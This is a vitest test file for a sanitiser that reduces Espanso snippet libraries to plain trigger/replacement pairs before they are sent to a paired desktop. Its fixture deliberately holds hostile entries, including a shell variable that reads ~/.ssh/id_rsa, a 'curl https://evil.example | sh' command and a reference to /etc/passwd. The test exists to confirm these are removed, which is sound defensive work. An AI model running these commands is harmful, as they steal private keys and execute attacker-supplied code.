import { createHash } from 'node:crypto'
import { describe, expect, it } from 'vitest'
import { LINK_HEADER, judgeEntry, linkSnippetsFrom, renderLinkYaml, type PlainSnippet } from '../server/link/espanso'
import { assertLinkAccepts } from './link-fixture'

const sha256 = (text: string) => createHash('sha256').update(text, 'utf8').digest('hex')

describe('the snippets a paired desktop receives', () => {
  it('drops every Espanso feature beyond a plain pair, and the library header with it', () => {
    const library = [
      '# poise-chat-library-v1 eyJpbXBvcnRzIjpbXSwibmFtZXMiOltdfQ',
      'global_vars:',
      '  - name: secret',
      '    type: shell',
      '    params: { cmd: "cat ~/.ssh/id_rsa" }',
      'imports:',
      '  - /tmp/evil.yml',
      'matches:',
      '  - trigger: ";sig"',
      '    replace: "Best,\\nOcto"',
      '  - trigger: ";hi"',
      '    replace: hello',
      '    label: Greeting',
      '  - trigger: ";pwn"',
      '    replace: "{{out}}"',
      '    vars: [{ name: out, type: shell, params: { cmd: "curl https://evil.example | sh" } }]',
      '  - trigger: ";py"',
      '    replace: "{{out}}"',
      '    vars: [{ name: out, type: script, params: { args: [python, -c, "import os"] } }]',
      '  - trigger: ";date"',
      '    replace: "{{now}}"',
      '    vars: [{ name: now, type: date, params: { format: "%Y" } }]',
      '  - trigger: ";form"',
      '    form: "Hi [[name]]"',
      '  - trigger: ";fields"',
      '    replace: "[[name]]"',
      '    form_fields: { name: { type: text } }',
      '  - regex: "(?P<x>.*)!"',
      '    replace: "{{x}}"',
      '  - triggers: [";a", ";b"]',
      '    replace: many',
      '  - trigger: ";img"',
      '    image_path: /etc/passwd',
      '  - trigger: ";html"',
      '    replace: x',
      '    html: "<b>x</b>"',
      '  - trigger: ";md"',
      '    replace: x',
      '    markdown: "*x*"',
      '  - trigger: ";word"',
      '    replace: whole',
      '    word: true',
      '  - trigger: ";case"',
      '    replace: Cased',
      '    propagate_case: true',
      '  - trigger: ";clip"',
      '    replace: x',
      '    force_clipboard: true',
      '  - trigger: ";merge"',
      '    replace: x',
      '    <<: { vars: [{ name: o, type: shell, params: { cmd: id } }] }',
      '  - trigger: ";label"',
      '    replace: x',
      '    label: 5',
      '  - trigger: 123',
      '    replace: number trigger',
      '  - trigger: ";bad-unicode"',
      '    replace: "\\uD800"',
      '  - trigger: "   "',
      '    replace: blank trigger',
      '  - trigger: ";sig"',
      '    replace: a second ;sig, which the library does not show',
      '',
    ].join('\n')

    const { version, yaml } = linkSnippetsFrom(library)

    expect(assertLinkAccepts(yaml)).toEqual([
      { trigger: ';sig', replace: 'Best,\nOcto' },
      { trigger: ';hi', replace: 'hello', label: 'Greeting' },
    ])
    for (const word of ['poise-chat-library-v1', 'global_vars', 'imports', 'shell', 'script', 'vars', 'form', 'regex', 'image_path', 'html', 'markdown', 'word', 'propagate_case', 'force_clipboard', '<<', 'evil', 'number trigger']) {
      expect(yaml, word).not.toContain(word)
    }
    expect(version).toBe(sha256(yaml))
  })

  it('renders exactly what Poise Link renders for the same snippets', () => {
    // link/src-tauri/tests/link_flow.rs expects this file in Espanso's folder
    // for these two snippets; the workspace sends it byte for byte.
    expect(renderLinkYaml([{ trigger: ';sig', replace: 'Best,\nOcto' }, { trigger: ';hi', replace: 'hello' }])).toBe(
      `${LINK_HEADER}\nmatches:\n  - trigger: ";sig"\n    replace: "Best,\\nOcto"\n  - trigger: ";hi"\n    replace: "hello"\n`,
    )
    expect(renderLinkYaml([])).toBe(`${LINK_HEADER}\nmatches: []\n`)
  })

  it('round-trips text that YAML would otherwise read differently', () => {
    const tricky: PlainSnippet[] = [
      { trigger: ';q', replace: 'He said "hi" \\ bye', label: 'quotes' },
      { trigger: ';nl', replace: 'line 1\nline 2\r\n\ttabbed' },
      { trigger: ';yaml', replace: '*alias &anchor !tag #comment key: value - [x] {y} | > % @ `' },
      { trigger: ';var', replace: 'Dear {{name}},' },
      { trigger: ';ctl', replace: 'bell\u0007 esc\u001b del\u007f nel\u0085 ls\u2028 ps\u2029 bom\uFEFF' },
      { trigger: '123', replace: 'true', label: 'null' },
      { trigger: ';uni', replace: 'héllo 👋 日本' },
      { trigger: ' padded ', replace: '' },
    ]
    const yaml = renderLinkYaml(tricky)
    expect(assertLinkAccepts(yaml)).toEqual(tricky)
    // Control characters travel as escapes, so the file stays printable text.
    expect(yaml).toContain('bell\\u0007 esc\\u001B del\\u007F nel\\u0085 ls\\u2028 ps\\u2029 bom\\uFEFF')
    expect(yaml).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f\u2028\u2029\uFEFF]/)
  })

  it('versions the YAML it sends, and nothing else', () => {
    const plain = 'matches:\n  - trigger: ";hi"\n    replace: hello\n'
    const first = linkSnippetsFrom(plain)
    expect(linkSnippetsFrom(plain)).toEqual(first)
    // Comments, formatting, the library's own header and entries a desktop
    // never receives leave the version alone.
    expect(linkSnippetsFrom(`# poise-chat-library-v1 eyJ4IjoxfQ\n# a note\nmatches:\n  - { trigger: ';hi', replace: "hello" }\n  - trigger: ';sh'\n    replace: x\n    vars: [{ name: v, type: shell }]\n`).version).toBe(first.version)
    expect(linkSnippetsFrom('matches:\n  - trigger: ";hi"\n    replace: hello!\n').version).not.toBe(first.version)
    // No file yet, an empty file and an empty list are all the empty set.
    const empty = linkSnippetsFrom(null)
    expect(empty).toEqual({ yaml: `${LINK_HEADER}\nmatches: []\n`, version: sha256(`${LINK_HEADER}\nmatches: []\n`) })
    expect(linkSnippetsFrom('')).toEqual(empty)
    expect(linkSnippetsFrom('matches: []\n')).toEqual(empty)
  })

  it('refuses a library file YAML cannot read rather than sending an empty set', () => {
    expect(() => linkSnippetsFrom('matches:\n  - trigger: ";a"\n    replace: a\n    replace: b\n')).toThrow(/unique/)
    expect(() => linkSnippetsFrom('matches: []\n---\nmatches: []\n')).toThrow(/multiple documents/)
  })
})

describe('judging one Espanso entry', () => {
  it('names why an entry is not taken', () => {
    expect(judgeEntry({ trigger: ';x', replace: '{{o}}', vars: [{ name: 'o', type: 'shell' }] })).toEqual({ kind: 'not_plain', trigger: ';x', detail: 'it runs a shell command' })
    expect(judgeEntry({ trigger: ';x', replace: '{{o}}', vars: [{ name: 'o', type: 'script' }] })).toEqual({ kind: 'not_plain', trigger: ';x', detail: 'it runs a script' })
    expect(judgeEntry({ trigger: ';x', replace: 'x', word: true, propagate_case: true })).toEqual({ kind: 'not_plain', trigger: ';x', detail: 'it uses word, propagate_case' })
    expect(judgeEntry({ regex: '.*', replace: 'x' })).toEqual({ kind: 'not_plain', trigger: null, detail: 'it uses regex' })
    expect(judgeEntry({ trigger: ';x' })).toEqual({ kind: 'invalid', trigger: ';x', detail: 'its replacement is missing or not text' })
    expect(judgeEntry({ trigger: 5, replace: 'x' })).toEqual({ kind: 'invalid', trigger: null, detail: 'its trigger is missing or not text' })
    expect(judgeEntry({ trigger: ';x', replace: 'x', label: null })).toEqual({ kind: 'invalid', trigger: ';x', detail: 'its label is not text' })
    expect(judgeEntry('just text')).toEqual({ kind: 'invalid', trigger: null, detail: 'it is not a trigger and replacement' })
    expect(judgeEntry({ trigger: ';x', replace: 'x', label: 'L' })).toEqual({ kind: 'plain', snippet: { trigger: ';x', replace: 'x', label: 'L' } })
  })
})
